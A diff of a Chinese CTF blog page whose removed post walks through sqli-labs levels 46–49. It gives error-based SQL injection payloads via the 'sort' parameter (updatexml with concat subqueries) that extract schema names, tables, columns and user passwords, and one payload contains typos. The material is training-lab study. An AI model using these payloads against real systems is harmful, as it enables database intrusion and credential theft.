-  
-    <article id="post-page-29" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/02/18/page-29/" class="article-date">
-  <time class="dt-published" datetime="2021-02-18T03:01:52.000Z" itemprop="datePublished">2021-02-18</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/02/18/page-29/">sqlilabs 46 47 48 49</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>46 数字型注入?sort=1 即可</p>
-<p>用报错注入吧 updatexml</p>
-<p>?sort=1 and updatexml(1,oncat(‘|’,(select group_concat(schema_name)from information_schemata.)),1) 爆数据库 太多了显示不下</p>
-<p>限制一下?sort=1 and updatexml(1,concat(‘|’,(select group_concat(schema_name)from information_schema.schemata limit 0,1)),1) 从第一个开始显示一次显示一个 limit 0，1 更0就可以</p>
-<p>?sort=1 and updatexml(1,concat(‘|’,(select group_concat(table_name)from information_schema.tables where table_schema=’security’)),1) 爆表</p>
-<p>?sort=1 and updatexml(1,concat(‘|’,(select group_concat(column_name)from information_schema.columns where table_schema=’security’ and table_name=’users’)),1) users表的列</p>
-<p>?sort=1 and updatexml(1,concat(‘~’,(select concat_ws(‘|’,id,username,password)from security.users limit 0,1)),1)  爆数据 </p>
-<p>47 就sort=1’ 多一个单引号 </p>
-<p>48 49 关闭了错误回显 没办法用报错注入了 要么盲注 要么神奇的sqlmap</p>
-<p>复制一下地址后面加个sort=1 剩下的和之前的用id的一样了 </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/18/page-29/" data-id="ckrosnlua000hmow7e69r93bo" data-title="sqlilabs 46 47 48 49" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/05/03/page-46/" data-id="ckrosnlug000tmow75mny65jf" data-title="刷题4" class="article-share-link">Share</a>
       
       
       
@@ -749,7 +596,7 @@ var_dump(serialize($a));
 
   <nav id="page-nav">
     
-    <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/7/">Next &raquo;</a>
+    <a class="extend prev" rel="prev" href="/page/5/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/7/">Next &raquo;</a>
   </nav>
 
 </section>
@@ -781,23 +628,23 @@ var_dump(serialize($a));
       <ul>
         
           <li>
-            <a href="/2021/08/06/page-99/">HITCON 2017SSRFme</a>
+            <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
           </li>
         
           <li>
-            <a href="/2021/08/06/page-98/">网鼎杯 2018Comment</a>
+            <a href="/2021/08/13/page-109/">网鼎杯 2020 白虎组PicDown</a>
           </li>
         
           <li>
-            <a href="/2021/08/06/page-97/">CSCCTF 2019 QualFlaskLight</a>
+            <a href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
           </li>
         
           <li>
-            <a href="/2021/08/06/page-96/">ciscn2021 cyberpunck</a>
+            <a href="/2021/08/13/page-107/">SUCTF 2019EasyWeb</a>
           </li>
         
           <li>
-            <a href="/2021/08/06/page-95/">CISCN2019 总决赛 Day2 Web1Easyweb</a>
+            <a href="/2021/08/13/page-106/">WUSTCTF2020CV Maker</a>
           </li>
         
       </ul>
